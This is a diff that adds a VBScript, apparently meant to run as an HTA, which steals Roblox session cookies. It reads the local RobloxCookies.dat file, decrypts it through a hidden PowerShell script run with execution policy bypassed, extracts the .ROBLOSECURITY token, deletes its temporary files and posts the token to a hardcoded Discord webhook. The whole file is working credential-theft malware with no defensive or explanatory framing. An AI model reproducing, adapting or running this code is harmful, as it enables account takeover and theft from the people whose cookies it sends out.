@@ -1,0 +1,73 @@
+Option Explicit
+Dim fso, shell, webhook, tempDir
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+webhook = "https://discord.com/api/webhooks/1536210034533597225/BdCQraMq8r90M0R-sOGlFnACFESF_j1fdtKY5MJE3st5IYfBNndVYnP48EmVPyHsy9KG"
+tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
+
+Function GetLocation()
+  On Error Resume Next
+  Dim xmlhttp
+  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+  xmlhttp.Open "GET", "https://ipinfo.io/json", False
+  xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+  xmlhttp.Send
+  If xmlhttp.Status = 200 Then GetLocation = xmlhttp.responseText Else GetLocation = "{""ip"":""unknown""}"
+End Function
+
+Function GetRobloxCookie()
+  On Error Resume Next
+  Dim path, raw, b64, b64File, psFile, cmd, exec, ts, startPos, endPos, output
+  path = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+  If Not fso.FileExists(path) Then GetRobloxCookie = "": Exit Function End If
+  Set ts = fso.OpenTextFile(path, 1): raw = ts.ReadAll: ts.Close
+  startPos = InStr(1, raw, """CookiesData""")
+  If startPos = 0 Then GetRobloxCookie = "": Exit Function End If
+  startPos = InStr(startPos, raw, ":") + 1
+  Do While startPos <= Len(raw) And (Mid(raw, startPos, 1) = " " Or Mid(raw, startPos, 1) = """")
+    startPos = startPos + 1
+  Loop
+  endPos = startPos
+  Do While endPos <= Len(raw)
+    If Mid(raw, endPos, 1) = """" Then Exit Do
+    endPos = endPos + 1
+  Loop
+  b64 = Mid(raw, startPos, endPos - startPos)
+  If Len(b64) < 20 Then GetRobloxCookie = "": Exit Function End If
+  b64File = tempDir & "\a.txt"
+  Set ts = fso.CreateTextFile(b64File, True): ts.Write b64: ts.Close
+  psFile = tempDir & "\b.ps1"
+  Set ts = fso.CreateTextFile(psFile, True)
+  ts.WriteLine "Add-Type -AssemblyName System.Security"
+  ts.WriteLine "$b64=Get-Content -Raw '" & b64File & "'"
+  ts.WriteLine "$bytes=[Convert]::FromBase64String($b64.Trim())"
+  ts.WriteLine "$decrypted=[System.Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,0)"
+  ts.WriteLine "$data=[System.Text.Encoding]::UTF8.GetString($decrypted)"
+  ts.WriteLine "$i=$data.IndexOf('.ROBLOSECURITY')"
+  ts.WriteLine "if($i-ne-1){$i+=15;while($data[$i]-eq'`t'-or$data[$i]-eq' '){$i++};$s=$i;while($data[$i]-ne';'-and$data[$i]-ne'`n'-and$data[$i]-ne'`r'){$i++};$cookie=$data.Substring($s,$i-$s).Trim();if(-not$cookie.StartsWith('_|')){$l=$data.IndexOf('`n',$s);if($l-eq-1){$l=$data.Length};$line=$data.Substring($s,$l-$s);$parts=$line.Split('`t');for($p=$parts.Length-1;$p-ge0;$p--){if($parts[$p].Trim().StartsWith('_|')){$cookie=$parts[$p].Trim();break}}};if($cookie.StartsWith('_|')){$cookie}}"
+  ts.Close
+  cmd = "powershell -NoP -Ep Bypass -W Hidden -F """ & psFile & """"
+  Set exec = shell.Exec(cmd)
+  output = exec.StdOut.ReadAll
+  fso.DeleteFile b64File, True
+  fso.DeleteFile psFile, True
+  If Len(output) > 20 And Left(output, 2) = "_|" Then GetRobloxCookie = Trim(output) Else GetRobloxCookie = ""
+End Function
+
+Sub SendToWebhook(cookie)
+  On Error Resume Next
+  Dim payload, xmlhttp
+  payload = "{""content"":""**Hit!**```" & Replace(cookie, """", "\""") & "```""}"
+  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+  xmlhttp.Open "POST", webhook, False
+  xmlhttp.setRequestHeader "Content-Type", "application/json"
+  xmlhttp.Send payload
+End Sub
+
+Sub Main()
+  On Error Resume Next
+  Dim cookie: cookie = GetRobloxCookie()
+  If Len(cookie) > 20 Then SendToWebhook cookie
+  window.close
+End Sub
+Main
